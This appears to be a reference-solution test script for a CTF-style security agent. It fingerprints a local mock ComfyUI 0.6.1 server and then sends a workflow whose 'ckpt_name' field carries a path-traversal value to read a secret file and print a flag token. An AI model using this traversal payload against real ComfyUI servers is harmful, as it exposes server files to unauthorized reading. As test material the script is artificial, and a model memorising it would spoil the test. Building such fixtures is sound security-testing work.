#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""02 参考解：probe 定型 ComfyUI → 工作流参数（ckpt_name）路径穿越读服务端文件。"""
from __future__ import annotations

import json
import re
import sys
import threading
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[3] / "src"))
sys.path.insert(0, str(HERE))

from ctfy_agent.tools_local import LocalTools  # noqa: E402

import server  # noqa: E402


class _Store:
    def add_note(self, *args, **kwargs):  # noqa: D102
        pass


def main() -> int:
    srv, port = server.serve()
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        tools = LocalTools(_Store(), "fixture-infra-02")
        tools.allow_instance("127.0.0.1", port)
        base = f"http://127.0.0.1:{port}"

        # 1) 指纹：probe 定型 ComfyUI + 版本
        raw = tools.http_map(base + "/", mode="probe")
        payload = json.loads(raw)
        comps = payload.get("components") or []
        assert "ComfyUI" in comps, f"probe 未定型 ComfyUI：components={comps}；raw[:300]={raw[:300]}"
        assert "0.6.1" in raw, f"版本提取缺失（应含 0.6.1）：{raw[:300]}"

        # （页面级强特征是 crawl 兜底路径，这里顺带钉住：首页 marker 能被识别）
        crawl = tools.http_map(base + "/", mode="crawl")
        assert "__comfyui_frontend_version__" in crawl or "comfyui" in crawl.lower(), (
            f"crawl 未捕获页面强特征：{crawl[:200]}"
        )

        # 2) 打法（next 第 2 条）：ckpt_name 参数路径穿越
        workflow = {
            "prompt": {
                "10": {"class_type": "CheckpointLoaderSimple",
                       "inputs": {"ckpt_name": "../../../../srv/comfyui/secret_note.txt"}},
                "20": {"class_type": "CLIPTextEncode",
                       "inputs": {"text": "a cozy terminal", "clip": ["10", 1]}},
            },
        }
        resp = tools.http_request(
            base + "/prompt", method="POST",
            body=json.dumps(workflow),
            headers={"Content-Type": "application/json"},
        )
        match = re.search(r"comfyui-drop-token-\w+", resp)
        if not match:
            print(f"[fail] 回包里没找到 token：{resp[:300]}", file=sys.stderr)
            return 1
        print("[infra] comfyui")
        print(match.group(0))
        return 0
    finally:
        srv.shutdown()
        srv.server_close()


if __name__ == "__main__":
    raise SystemExit(main())
